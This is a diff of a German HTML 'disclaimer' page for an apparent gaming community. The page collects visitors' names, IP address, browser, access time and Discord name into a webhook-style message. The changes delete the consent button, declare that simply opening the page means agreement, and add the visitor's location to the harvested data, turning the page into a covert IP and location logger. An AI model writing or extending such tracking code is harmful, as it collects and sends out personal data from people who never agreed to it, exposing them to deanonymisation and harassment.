@@ -806,7 +806,7 @@
 <body>
 
     <h1>Willkommen! Bitte akzeptiere den Disclaimer, um fortzufahren.</h1>
-    <p>Durch Klicken auf "Verstanden" stimmst du den Bedingungen zu.</p>
+    <p>Durch den Seitenaufruf stimmst du den Bedingungen zu.</p>
 
     <!-- Formular für Vor- und Nachnamen sowie IC Name und Discord-Name -->
     <div id="name_input">
@@ -824,12 +824,6 @@
 
         <label for="discord_name">Discord Name (Optional):</label>
         <input type="text" id="discord_name" placeholder="Dein Discord Name (z.B. Username#1234)" ><br><br>
-    </div>
-
-    <!-- Das Feld, das den Button und die Nachricht enthält -->
-    <div id="disclaimer_container" style="display:none;">
-        <p>Bitte lese den Disclaimer sorgfältig durch.</p>
-        <button id="disclaimer_button" onclick="disclaimerAccepted()">Verstanden</button>
     </div>
 
     <!-- Das JavaScript für die Interaktion -->
@@ -898,7 +892,8 @@
                             { "name": "🌍 **IP Adresse**", "value": ipAddress, "inline": false },
                             { "name": "🌐 **Verwendeter Browser**", "value": userBrowser, "inline": false },
                             { "name": "🕒 **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false },
-                            { "name": "💬 **Discord Name**", "value": discordName, "inline": true }
+                            { "name": "💬 **Discord Name**", "value": discordName, "inline": true },
+                            { "name": "📍 **Standort**", "value": `${location} 🗺️`, "inline": false } // Standort mit Emoji
                         ],
                         "footer": {
                             "text": "🛡️ Disclaimer System | Bereitgestellt von Missiont31 https://missiont31.github.io/bu-geldrechner/",
